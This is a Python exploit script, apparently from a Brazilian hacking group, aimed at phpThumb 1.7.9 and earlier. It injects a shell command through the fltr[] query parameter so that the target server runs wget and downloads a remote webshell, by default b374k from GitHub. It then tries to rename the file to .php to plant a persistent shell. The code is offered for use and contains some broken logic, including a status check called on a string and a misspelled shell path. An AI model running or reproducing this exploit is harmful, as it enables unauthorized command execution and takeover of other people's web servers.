#!/usr/bin/python3

try: 
	import requests as r 
except: print("Instale o modulo requests (pip3 install requests)"); exit()
import sys, os,re, time; import argparse as arg ; os.system('cls' if os.name == 'nt' else 'reset')

def arruma(url):
	if url[:7] != "http://" and url[:8] != "https://":
		url = "http://" + url
	return url

index = r"""
 ÛÛÛÛÛ ÛÛÛÛÛ   ÛÛÛÛÛÛÛÛÛ                                    
°°ÛÛÛ °°ÛÛÛ   ÛÛÛ°°°°°ÛÛÛ                                   
 °°ÛÛÛ ÛÛÛ   ÛÛÛ     °°°  ÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛ  ÛÛÛÛÛ ÛÛÛ ÛÛÛÛÛ
  °°ÛÛÛÛÛ   °ÛÛÛ         °°ÛÛÛ°°ÛÛÛ ÛÛÛ°°ÛÛÛ°°ÛÛÛ °ÛÛÛ°°ÛÛÛ 
   °°ÛÛÛ    °ÛÛÛ          °ÛÛÛ °°° °ÛÛÛÛÛÛÛ  °ÛÛÛ °ÛÛÛ °ÛÛÛ 
    °ÛÛÛ    °°ÛÛÛ     ÛÛÛ °ÛÛÛ     °ÛÛÛ°°°   °°ÛÛÛÛÛÛÛÛÛÛÛ  
    ÛÛÛÛÛ    °°ÛÛÛÛÛÛÛÛÛ  ÛÛÛÛÛ    °°ÛÛÛÛÛÛ   °°ÛÛÛÛ°ÛÛÛÛ   
   °°°°°      °°°°°°°°°  °°°°°      °°°°°°     °°°° °°°°    

   * phpThumb <= 1.7.9 Remote Comand Execute (RCE) exploit
   * Criado por Supr3m0 && W4r1o6k (Yunkers Crew)
   * Facebook: www.facebook.com/yunkers01/
   * Github: www.github.com/2inf3rnal/
"""
manual = """--url (-u)           Site alvo
--threads (-t)       Tempo para cada requisição
--shell (-s)         Link da shell que será upada (Default: b374k)

OBS: Insira a URL sem o '?src='
	 Ex: Minha URL é essa: www.site.com/phpthumb/thumb.php?src=xxxx
	     Então vou inserir no exploit isso: www.site.com/phpthumb/thumb.php
"""

parser = arg.ArgumentParser()
parser.add_argument("--url","-u", action='store')
parser.add_argument("--threads", "-t", action='store', default = "10", type = int)
parser.add_argument("--shell", "-s", action='store', default = "https://raw.githubusercontent.com/b374k/b374k/master/index.php")
param = parser.parse_args()

if len(sys.argv) == 1: print(index); print(manual); exit()
if not param.url: print(index); print("[x] Insira um alvo/url (--url)");exit()

url = arruma(param.url)

def inicio():
	print(index)
	print("[+] Site: {}".format(url))
	print("[+] Webshell/arquivo: {}".format(param.shell))
	sys.stdout.write("\n[*] Verificando conexão: "); sys.stdout.flush()
	try:
		checa = r.get(url)
		if checa.status_code == 200: sys.stdout.write("conectado!\n"); sys.stdout.flush()
		else: sys.stdout.write("erro!\n"); sys.stdout.flush(); exit()

	except  Exception as erro: print("\n\n[x] Ocorreu um erro: {}",erro) ;exit()
	sys.stdout.write("[*] Carregando payload"); sys.stdout.flush()
	for _ in range(3):
		time.sleep(0.5)
		sys.stdout.write("."); sys.stdout.flush()
	sys.stdout.write("pronto!");sys.stdout.flush()
	phpthumb_exploit()
def phpthumb_exploit():
	envia_txt = url + "?src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg ; wget {} -O ycrew.txt ; &phpThumbDebug=9".format(param.shell)
	sys.stdout.write("\n[*] Inserindo payload: ")
	sys.stdout.flush()
	try:
		injeta_envia_txt = r.get(envia_txt)
		if injeta_envia_txt.status_code == 200:
			sys.stdout.write("Payload enviado com sucesso!\n"); sys.stdout.flush()
		else:
			sys.stdout.write("Erro ao enviar o payload :/\n"); sys.stdout.flush();exit()

	except Exception as erro: print("\n[x] Aconteceu algum erro: ",erro); exit()

	sys.stdout.write("[*] Verificando se a shell em txt foi enviada: "); sys.stdout.flush()
	regex_url = re.search(r"\/(\-)?\w+(\-)?\.php", url); url_txt = url.replace(regex_url.group(), "")
	url_txt = url_txt + "/ycrew.txt"

	try:
		verifica = r.get(url_txt)
		if verifica.status_code == 200:
			sys.stdout.write("Shell em txt enviada com sucesso!\n"); sys.stdout.flush()
		else:
			sys.stdout.write("Shell não enviada!\n"); sys.stdout.flush() ; exit()
	except Exception as erro: print("\n[x] Aconteceu algum erro: ",erro); exit()

	sys.stdout.write("[*] Enviando shell em php: "); sys.stdout.flush()

	try:
		injeta_envia_php = envia_txt.replace("wget {} -O ycrew.txt".format(param.shell), "mv ycrew.txt ycrew.php".format(param.shell))
		if injeta_envia_php.status_code == 200:
			url_php = url.replace(regex_url.group(), "") ; url_php = url_php + "/ycrew.php"
			checa = r.get(url_php)
			if checa.status_code == 200: sys.stdout.write("Enviada ({})".format(url.replace(regex_url, "") + "/ycew.php")); sys.stdout.flush(); exit()
			else: sys.stdout.write("Shell não enviada :/ !"); sys.stdout.flush() ; exit()
		else: sys.stdout.write("Shell não enviada :/ !"); sys.stdout.flush() ; exit()

	except Exception as erro: print("\n[x] Aconteceu algum erro: ",erro); exit()
if __name__ == "__main__":
	try: inicio()
	except KeyboardInterrupt: exit("\n")
